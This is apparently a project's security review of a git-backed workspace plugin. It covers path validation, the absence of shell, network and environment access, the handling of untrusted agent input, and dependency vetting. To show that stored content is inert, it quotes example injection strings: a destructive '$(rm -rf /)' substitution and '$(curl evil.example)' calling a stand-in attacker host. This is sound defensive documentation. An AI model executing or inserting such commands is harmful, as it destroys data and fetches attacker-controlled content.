# Security — `@ax/workspace-git`

This package is the first real backing for the `workspace:*` contract. It registers four service hooks (`workspace:apply`, `workspace:read`, `workspace:list`, `workspace:diff`) on the host-side bus and stores every snapshot in a bare `isomorphic-git` repository at `<repoRoot>/repo.git`. Linear history only — every apply is a CAS on `refs/heads/main`, no branches, no merges. The `WorkspaceVersion` opaque string is a 40-hex commit SHA today, but per Invariant 1 subscribers must treat it as opaque. This note captures the `security-checklist` walk for the Week 7-9 landing.

## Security review (workspace-git)

- **Sandbox:** Filesystem reach is fenced to `<repoRoot>/repo.git`; every write goes through `isomorphic-git`'s object-db (no caller-supplied path ever reaches `fs.writeFile` directly), and `validatePath` rejects `..`, absolute, NUL, backslash, and `.git` segments before any blob is written. No process spawn, no env reads, no network — `isomorphic-git` is pure JS and we don't ship the `http` variant.
- **Injection:** `FileChange.content` is opaque `Uint8Array` written via `git.writeBlob` — never interpolated into a shell, path, SQL, or URL. Agent-supplied `reason` lands in the commit message only; agent-supplied `agentId`/`userId`/`sessionId` land in `WorkspaceDelta.author` only and are never used as the git author/email (those are hard-coded `ax-runner`).
- **Supply chain:** Two new runtime deps, both pinned exact: `isomorphic-git@1.37.5` (MIT, established maintainer set, no install hooks) and `picomatch@4.0.4` (MIT, Jon Schlinkert / micromatch org, no install hooks). Transitive surface is mostly self-contained pure-JS git plumbing; one entry (`simple-get`) is network-capable but unreachable from the code paths we use.

## Sandbox escape / capability leakage

The capability budget for this plugin is one directory and zero of everything else. Here's how each axis lands:

### Filesystem reach

`repoRoot` comes from caller config and never from a hook payload — it's set once when the plugin is constructed. Everything we write goes under `<repoRoot>/repo.git/` via `isomorphic-git`'s `gitdir` parameter (`impl.ts:341`). The library writes loose objects into `objects/`, refs into `refs/`, packs into `objects/pack/`, and that's it. No part of this code path ever calls `fs.writeFile` with a caller-supplied path string — paths from `FileChange` go to `git.writeBlob` as content, not as filenames, and the resulting OID is the only thing that hits the FS.

For the writes that DO touch caller-supplied filenames (the path inside the tree object), `validatePath` (`impl.ts:84-136`) runs BEFORE the mutex is taken so a bad input fails fast and can't deadlock. It rejects:

- Empty / non-string paths.
- NUL bytes (which would otherwise truncate when crossing into native syscalls).
- Leading `/` (absolute paths).
- Backslashes (the workspace contract is POSIX; Windows separators get an explicit "no").
- Empty segments, `.`, and `..` (which would otherwise traverse out of the repo if a future backend resolved them naively).
- Any segment named `.git` (defense-in-depth; we don't currently materialize the working tree, but if a future backend does, this prevents writing into the metadata dir).

Reads, lists, and diffs (`impl.ts:438-535`) take a `path` parameter that goes to `git.readBlob({ filepath })` and `git.listFiles({ ref })`. These resolve against the object-db's tree structure, not the host filesystem — `..` in a `readBlob` filepath asks for an entry literally named `..` inside the tree, which doesn't exist, and you get a `NotFoundError`. There's no host-FS traversal vector here even without `validatePath` on the read side.

### Process spawn

None. We confirmed by inspection that `impl.ts` and `plugin.ts` import only `node:fs`, `node:path`, `isomorphic-git`, `picomatch`, and `@ax/core`. No `child_process`, no `execa`, no `spawn`, no shell. `isomorphic-git` is pure JavaScript by design — that's the entire reason it exists, as a replacement for shelling out to `/usr/bin/git`. If a future change introduced a shell-out for performance (e.g., delegating to `git pack-objects`), that would need its own security review and almost certainly its own argv-injection story.

### Env vars

None read by this plugin. `repoRoot` comes from config, the bot author identity is hard-coded, and there's no `process.env.*` access in either source file.

### Network

None. We import `isomorphic-git`, NOT `isomorphic-git/http/node` — the network-capable HTTP variant is a separate sub-export that this package never references. The transitive dep `simple-get` is pulled in because `isomorphic-git`'s package.json lists it as a dependency, but it's only invoked from the `http` code paths, which we don't touch. If we ever add `git.clone` / `git.push` / `git.fetch`, network capability arrives with them and that's a separate review.

### Argv injection

Not applicable. There's no shell command construction, no argv array, nothing to inject into.

## Prompt injection / untrusted content

The agent and the model can influence three things this plugin sees: the `path` of a `FileChange`, the `content` bytes, and the `reason` string. None of these get treated as code.

### LLM output

Never reaches this plugin directly. Tools running in the sandbox may compute path strings from model output and send them up through the tool-result channel, but by the time those strings hit `workspace:apply` they've crossed the IPC bridge and are validated by `validatePath` before any FS-adjacent operation. The `safePath`-style checks (no `..`, no absolute, no `.git`, no NUL, no `\`) are a single chokepoint — there's no second path-validation lurking in `read`/`list`/`diff` because those paths resolve against the git object-db, which is structurally safe.

### Tool output

`FileChange.content` is `Bytes` (`Uint8Array`). It's written verbatim via `git.writeBlob` (`impl.ts:174`) and read back verbatim via `git.readBlob`. We never decode it, never interpret it as JSON or a shell command, never log it, never interpolate it. A blob containing `$(rm -rf /)` is just 14 bytes that go into the object-db and come back out as 14 bytes.

We do make a defensive copy of incoming bytes in `applyChanges` (`impl.ts:240-253`) so a caller mutating their input buffer after `apply` returns can't poison our snapshot, and another defensive copy on the way out of `read` and `readBlobBytes` so a subscriber mutating the returned buffer can't poison whatever isomorphic-git might cache or share.

### Agent-supplied `reason`

Flows into the git commit message via `git.commit({ message: input.reason ?? 'workspace apply' })` (`impl.ts:407-411`). isomorphic-git serializes this into the commit object byte-for-byte; there's no shell, no template, no `eval`. A `reason` containing `\n--no-verify\n` or `$(curl evil.example)` is just text that ends up in the commit body.

That said: subscribers of the future `workspace:applied` subscriber hook (Task 7b) MUST NOT shell-interpolate or `exec` the `reason`. If a notification subscriber pipes commit messages into a system shell ("send a Slack message that says: $reason"), they own that injection. We treat `reason` as untrusted on the producer side — anyone reading it downstream needs to do the same.

### Agent-supplied provenance

`ctx.agentId`, `ctx.userId`, and `ctx.sessionId` flow into `WorkspaceDelta.author` (`impl.ts:381-385`) and from there into the `applied` subscriber hook payload. They are NOT used as the git `author.name` / `author.email` — those are the hard-coded `BOT_AUTHOR = { name: 'ax-runner', email: 'ax-runner@example.com' }` (`impl.ts:32-35`). The agent never gets to sign a commit as someone else. Anyone running `git log` on the repo sees `ax-runner` as the author of every commit; the human/agent provenance lives in the bus payload, where subscribers know to treat it as untrusted metadata rather than verified identity.

## Supply chain

Two new runtime deps. Both pinned to exact versions in `package.json` (no `^` or `~`). The full `pnpm why isomorphic-git` from the worktree shows it as a direct dep of `@ax/workspace-git` only — nothing else in the monorepo pulls it in, so the blast radius of a compromised version is contained to this one plugin until we wire `@ax/preset-local` (which we will, intentionally, in a later task).

### `isomorphic-git@1.37.5`

- **License:** MIT.
- **Pin:** Exact (`"isomorphic-git": "1.37.5"`).
- **Maintainers:** `wmhilton` (William Hilton, project lead since 2017), `mojavelinux` (Dan Allen), `jcubic` (Jakub Jankiewicz). Established maintainer set, ~6+ years of releases, project is the de facto pure-JS git library on npm.
- **Install hooks:** None that fire on consumer install. `npm view isomorphic-git@1.37.5 scripts` returns `start`, `format`, `build`, `test`, `publish-website`, `prepublishOnly`, `semantic-release`, `add-contributor`. The only lifecycle script that npm/pnpm runs automatically is `prepublishOnly`, and that fires when the maintainer publishes the package, not when we install it. There is no `preinstall`, `install`, `postinstall`, or `prepare` script — confirmed.
- **Why pure-JS matters here:** the entire reason this plugin can claim "no process spawn" is that `isomorphic-git` doesn't spawn `git`. It implements the git object format, pack format, and ref handling in JavaScript. That's a much larger code surface than shelling out — but it's a code surface we can read, audit, and pin a hash of, instead of inheriting whatever `/usr/bin/git` happens to be on the host.
- **Transitive surface (notable entries from `npm view ... dependencies`):**
  - `clean-git-ref@^2.0.1` — ref-name validation. Tiny, pure JS.
  - `crc-32@^1.2.0` — checksums. Pure JS, pinned widely across the ecosystem.
  - `pako@^1.0.10` — zlib in pure JS. Used to compress git objects. Established library.
  - `sha.js@^2.4.12` — SHA hashing in pure JS. Used for git's content-addressed storage.
  - `async-lock@^1.4.1`, `pify@^4.0.1`, `readable-stream@^4.0.0`, `minimisted@^2.0.0`, `ignore@^5.1.4`, `diff3@0.0.3` — utility/plumbing.
  - `simple-get@^4.0.1` — HTTP client. **Network-capable, but only reached from the `isomorphic-git/http/node` sub-export**, which this package does not import. We're paying the disk-space cost without granting the capability to our code paths.
  
  None of the above have install hooks at the versions resolved. The transitive set is consistent with a "pure-JS git plumbing" claim; nothing here phones home, reads env vars at import, or shells out.

### `picomatch@4.0.4`

- **License:** MIT.
- **Pin:** Exact (`"picomatch": "4.0.4"`).
- **Maintainers:** `jonschlinkert` (Jon Schlinkert, micromatch org), `mrmlnc`, `doowb`, `danez`. Established npm maintainers; `picomatch` is the glob engine behind `chokidar`, `micromatch`, `fast-glob`, and most of the file-watching ecosystem. Weekly downloads in the hundreds of millions.
- **Install hooks:** None. `npm view picomatch@4.0.4 scripts` returns `lint`, `test`, `mocha`, `test:ci`, `test:cover` — all dev-time. No `preinstall`, `install`, `postinstall`, or `prepare`.
- **Use:** `workspace:list` calls `picomatch(input.pathGlob, { dot: true })` (`impl.ts:474`) when the caller passes a glob, and filters the listed paths through it. The matcher receives caller-supplied glob strings, but the matcher's output is just a boolean over already-validated path strings — even a maliciously crafted glob can at worst match too few or too many files, not escape the repo. The `{ dot: true }` flag means we don't silently hide entries starting with `.`.
- **Known concerns:** glob libraries have historically had ReDoS issues. `picomatch` mitigates by compiling the glob to a regex with bounded backtracking, but a sufficiently pathological glob could still spike CPU. The glob comes from a host-side caller today (the runner, not the agent); when sandbox-side tools are allowed to specify `pathGlob`, this is worth re-checking.

## Boundary review

- **Alternate impl this hook could have:** `@ax/workspace-postgres` — same four service hooks, but storing snapshots as content-addressed blobs in Postgres (path → bytes per version, with parent pointers). The `WorkspaceVersion` would be a UUID or a hash-of-rows, not a SHA. Service hook signatures don't change; the implementation behind them does.
- **Payload field names that might leak:** none. `WorkspaceVersion` is opaque (the fact that it's a SHA today is documented as an implementation detail). `FileChange` uses `path` / `kind` / `content`. `WorkspaceDelta` uses `before` / `after` / `changes` / `reason` / `author`. No `commit`, `sha`, `oid`, `tree`, `ref`, `gitdir`, or other git-specific vocabulary leaks across the hook surface. The `repoRoot` config is plugin-local, not on any payload.
- **Subscriber risk:** today, no production subscribers (Task 7b adds the `workspace:applied` notification). Subscribers MUST treat `before` / `after` as opaque strings — if a subscriber tries to parse them as 40-hex SHAs, they break the day a Postgres-backed alternate impl ships. We'll spell this out in the subscriber-hook docs when 7b lands.
- **Wire surface (IPC):** none here. The `workspace:apply` IPC schema lives with the IPC server / runner bridge, not in this plugin. This plugin is host-side only.

## Known limits

- **Single-replica only.** The per-repo `Mutex` (`impl.ts:48-63`) serializes apply within one process. Multi-replica deployments need an external lock (advisory lock in Postgres, or a real ref-update CAS). Deferred to Week 10+ when multi-replica becomes a thing.
- **No GC.** Failed applies leave dangling blobs and trees in `objects/`. `isomorphic-git` doesn't ship a `git gc` equivalent, and we don't run one. Disk usage grows monotonically with churn; for the MVP this is fine, but a long-lived repo will eventually want a sweeper.
- **No working-tree materialization.** This plugin is bare-repo only. Tools that need a checkout (e.g., a build that compiles a project) get bytes via `workspace:read` and write to a scratch dir themselves. That's a deliberate capability minimization — checkouts mean filesystem reach beyond `repoRoot/repo.git`, which would expand the sandbox story.
- **No commit signing.** All commits are unsigned. If we ever need to prove provenance from the git history alone (rather than from the bus audit log), we'll need to plumb a signing key. Not on the roadmap; the bus audit log is the source of truth for provenance.
- **`reason` length and content are unchecked.** A 10MB commit message would be silently accepted. Practical exploit surface is low (it ends up in the commit body, not a shell), but if storage costs matter we may add a length cap.

## What we don't know yet

- Whether the `WorkspaceVersion`-as-SHA leak via timing or content-addressed observability matters in a multi-tenant deployment. Two tenants who both `apply` the same exact bytes will produce the same SHA. That's deterministic by design, but it leaks the existence of identical content across tenants if both can observe `WorkspaceVersion`. The Postgres-backed alternate impl with random version IDs sidesteps this; the git-backed impl can't without changing the commit's parent or author bytes per tenant.
- How `workspace:applied` subscribers should handle a `reason` that contains a newline or a control character. We'll punt on this until 7b lands and we have a concrete subscriber to design against.
- Whether the per-repo mutex should also serialize reads. Today reads run concurrently with writes (isomorphic-git reads from immutable object files, so the worst case is reading a slightly stale ref), but if a future backend has weaker isolation we may need to revisit.

## Security contact

If we find a hole, we'd rather hear about it from you than read about it on Hacker News. Please email `vinay@canopyworks.com`.
